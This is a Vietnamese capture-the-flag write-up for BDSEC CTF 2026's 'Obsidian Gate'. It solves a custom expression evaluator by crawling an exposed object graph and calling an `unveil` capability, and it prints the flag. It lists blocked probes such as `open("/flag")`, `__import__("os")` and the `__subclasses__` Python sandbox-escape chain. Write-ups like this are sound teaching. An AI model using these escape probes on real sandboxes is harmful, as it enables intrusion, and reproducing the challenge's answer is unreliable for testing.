---
title: "Obsidian Gate - Quá trình giải chi tiết"
slug: "bdsecctf-2026-obsidian-gate"
date: "2026-07-27"
description: "Khai thác capability bị lộ trong object graph của expression evaluator để mở sealed archive và lấy flag."
category: "misc"
event: "BDSEC CTF 2026"
year: 2026
difficulty: "medium"
author: "Huyen Chi"
tags:
  - Python Sandbox
  - Object Graph
  - Capability
  - CTF
status: "published"
---

## 1. Thông tin challenge

- Instance: `nc 66.228.50.16 48271`
- Mô tả: "Beyond the obsidian gate lies a sealed archive."
- Flag format: `BDSEC{s0mething_h3re}`
- Giao diện dịch vụ: nhận đúng một expression và trả về một kết quả.

```text
One expression. One answer.
>
```

Mục tiêu không phải là thoát Python sandbox để đọc file hệ thống. Service dùng một expression evaluator tự viết, có whitelist riêng. Hướng đúng là tìm capability đã được expose trong object graph của evaluator.

## 2. Tái hiện môi trường và resource đi kèm

Toàn bộ script và kết quả probe được lưu tại `resources/bdsecctf-2026-obsidian-gate/`. Chạy các lệnh dưới đây từ repository root:

| Tệp | Vai trò |
| --- | --- |
| `try_input.py` | Gửi các expression cơ bản, phân loại lỗi và ghi bảng kết quả Markdown. |
| `name_oracle_probe.py` | Quét tên global bằng các form `name`, `type(name)`, `repr(name)`, `len(name)`, `dir(name)`. |
| `object_crawler.py` | Duyệt breadth-first object graph bắt đầu từ một expression, dùng `dir(...)` để lấy field. |
| `solve.py` | Gửi payload cuối, trích flag bằng regex. |
| `error_list.md` | Kết quả triage expression từ baseline suite. |
| `name_oracle_high_value.md` | Kết quả probe xác nhận global object `root`. |
| `object_graph.md` | Kết quả duyệt object graph. |
| `unveil_call_probe.md` | Kết quả kiểm tra capability `unveil`. |

Kiểm tra syntax các script và chạy payload cuối:

```bash
python3 -m py_compile resources/bdsecctf-2026-obsidian-gate/try_input.py resources/bdsecctf-2026-obsidian-gate/name_oracle_probe.py resources/bdsecctf-2026-obsidian-gate/object_crawler.py resources/bdsecctf-2026-obsidian-gate/solve.py
python3 resources/bdsecctf-2026-obsidian-gate/solve.py
```

Lưu ý: instance đôi lúc phản hồi chậm. Các script đã đọc prompt bằng non-blocking socket, có timeout và retry. Vì vậy, `no response` trong các file quét ban đầu không đủ để kết luận một primitive hoạt động; các ứng viên quan trọng cần được retest tuần tự với timeout dài hơn.

## 3. Triage ngôn ngữ expression

Bắt đầu bằng `try_input.py` với suite cơ bản:

```bash
python3 resources/bdsecctf-2026-obsidian-gate/try_input.py --suite baseline --markdown resources/bdsecctf-2026-obsidian-gate/error_list.md
```

Kết quả trong `error_list.md` cho thấy các nhóm sau.

### Phép toán được chấp nhận

```text
0                 -> 0
0x41              -> 65
0b101             -> 5
"x"               -> 'x'
"abc"[0]          -> 'a'
len("")           -> 0
len("abc")        -> 3
type(0)           -> 'int'
type("")          -> 'str'
repr(0)           -> '0'
repr("")          -> "''"
```

`len`, `type` và `repr` là các call được whitelist, không phải object/function Python có thể lấy ra trực tiếp: `len`, `type`, `repr` đứng một mình đều bị `GateError: unknown name`.

### Phép toán bị chặn

```text
1+2                         -> GateError: operation denied
[] / {} / (1,2)             -> GateError: operation denied
1.5 / False / None          -> GateError: constant denied
"".__class__                -> GateError: attribute denied
getattr("", "__class__")   -> GateError: unknown call
open("/flag")               -> GateError: unknown call
__import__("os")            -> GateError: unknown call
```

Hai lỗi ban đầu cần phân biệt:

```text
+       -> GateError: malformed expression
a       -> GateError: unknown name
```

`malformed expression` xảy ra trước evaluator, khi cú pháp/token không hợp lệ. `unknown name` xác nhận identifier hợp lệ về cú pháp nhưng không nằm trong environment. Nhận biết này quan trọng: thay vì chỉ thử call, cần quét tên global ở dạng bare expression.

### Các hướng đã loại trừ

Suite `functions`, `escape` và `directions` trong `try_input.py` đã retest các hướng thông dụng:

- Đọc file và chạy command: `open`, `read`, `cat`, `system`, `popen`, `run`, `spawn`, ... đều `unknown call`.
- Python escape: attribute access bị chặn; `getattr`, `eval`, `exec`, `compile`, `__import__`, `globals`, `locals`, `vars` đều không có trong whitelist.
- Leak địa chỉ: `id` bị chặn; `repr` chỉ trả string representation của giá trị evaluator, không phải địa chỉ Python.
- Arithmetic, concatenation, list/tuple/dict và comparison đều bị chặn, nên các primitive `len`, `type`, indexing không tạo được chuỗi exploit để escape.

Vì vậy, payload `().__class__.__bases__[0].__subclasses__()` là hướng sai: cả `.` và các builtin cần thiết đều không đi qua evaluator.

## 4. Tìm global object `root`

Sau khi quét function không ra hướng đọc flag, chuyển sang quét global name. Script `name_oracle_probe.py` tạo candidate từ wordlist và thử mỗi tên ở năm dạng:

```text
name
type(name)
repr(name)
len(name)
dir(name)
```

Có thể tái hiện phát hiện quan trọng bằng:

```bash
python3 resources/bdsecctf-2026-obsidian-gate/name_oracle_probe.py --names root --markdown resources/bdsecctf-2026-obsidian-gate/name_oracle_high_value.md
```

Kết quả:

```text
root       -> <obsidian root>
type(root) -> 'root'
repr(root) -> '<obsidian root>'
dir(root)  -> ['ash', 'mirror', 'observer', 'year']
len(root)  -> GateError: length denied
```

`root` là global quan trọng tìm được trong wordlist đã quét, và `dir(root)` chứng minh evaluator cho phép enumerate field của object nội bộ. Đây là primitive cần tìm; không cần Python object escape.

## 5. Duyệt object graph

Dùng dot access hoặc key access đều hợp lệ với object này:

```text
root.observer
root["observer"]
```

Key integer bị chặn (`root[0] -> GateError: key denied`), nên danh sách từ `dir(...)` được dùng làm key/field cần theo.

Script duyệt tự động có thể chạy như sau:

```bash
python3 resources/bdsecctf-2026-obsidian-gate/object_crawler.py --start root --max-depth 8 --markdown resources/bdsecctf-2026-obsidian-gate/object_graph.md
```

Nó thực hiện, với mỗi node, các probe `value`, `type`, `repr`, `len`, `dir`; nếu `dir` trả một list string thì thêm các child vào hàng đợi BFS. `object_graph.md` ghi lại 34 node và cho thấy các nhánh decoy như `ash`, `mirror`, `dust`, `empty`.

Quá trình thủ công theo nhánh phù hợp với hint "sealed archive":

```text
dir(root)
-> ['ash', 'mirror', 'observer', 'year']

root.observer
-> <observer>
dir(root.observer)
-> ['left', 'right', 'state']

root.observer.right
-> <right>
dir(root.observer.right)
-> ['mark', 'memory']

root.observer.right.memory
-> <archive>
dir(root.observer.right.memory)
-> ['catalog', 'dust']

root.observer.right.memory.catalog
-> <catalog>
dir(root.observer.right.memory.catalog)
-> ['index', 'version']

root.observer.right.memory.catalog.index
-> <index>
dir(root.observer.right.memory.catalog.index)
-> ['empty', 'sealed']

root.observer.right.memory.catalog.index.sealed
-> <sealed>
dir(root.observer.right.memory.catalog.index.sealed)
-> ['status', 'unveil']

root.observer.right.memory.catalog.index.sealed.status
-> 'intact'
```

Những giá trị sau xác nhận các nhánh khác là decoy hoặc cycle an toàn:

```text
root.ash.density                -> 17
root.ash.next.value             -> 0
root.mirror.echo.value          -> 'nothing answers'
root.observer.right.mark        -> 'obsidian'
root.observer.right.memory.dust -> <ash>
```

## 6. Gọi capability `unveil`

Field còn lại của `sealed` có thể được kiểm tra trước khi gọi:

```text
root.observer.right.memory.catalog.index.sealed.unveil
-> <capability unveil>

type(root.observer.right.memory.catalog.index.sealed.unveil)
-> 'capability'
```

`resources/bdsecctf-2026-obsidian-gate/unveil_call_probe.md` xác nhận capability này chỉ nhận zero argument:

```text
root.observer.right.memory.catalog.index.sealed.unveil(0)
-> GateError: arguments denied
```

Gọi không tham số trả flag:

```text
root.observer.right.memory.catalog.index.sealed.unveil()
-> 'BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}'
```

Hai cách viết tương đương cũng đã được xác nhận:

```text
root.observer.right.memory.catalog.index.sealed["unveil"]()
root["observer"]["right"]["memory"]["catalog"]["index"]["sealed"]["unveil"]()
```

## 7. Payload và flag

Payload ngắn gọn nhất:

```text
root.observer.right.memory.catalog.index.sealed.unveil()
```

`resources/bdsecctf-2026-obsidian-gate/solve.py` gửi chính payload này, đợi prompt, in response và trích flag với regex `BDSEC\{[^}\n]+\}`.

```text
BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}
```

## 8. Kết luận kỹ thuật

Lỗi thiết kế của service là expose `root` trong global environment, cho phép `dir(object)` liệt kê field, và cho phép truy cập field/call capability theo kết quả enumerate. Dù evaluator chặn gần như toàn bộ Python builtin và attribute escape, chuỗi primitive này vẫn đủ để duyệt đến sealed archive và gọi capability làm lộ flag.
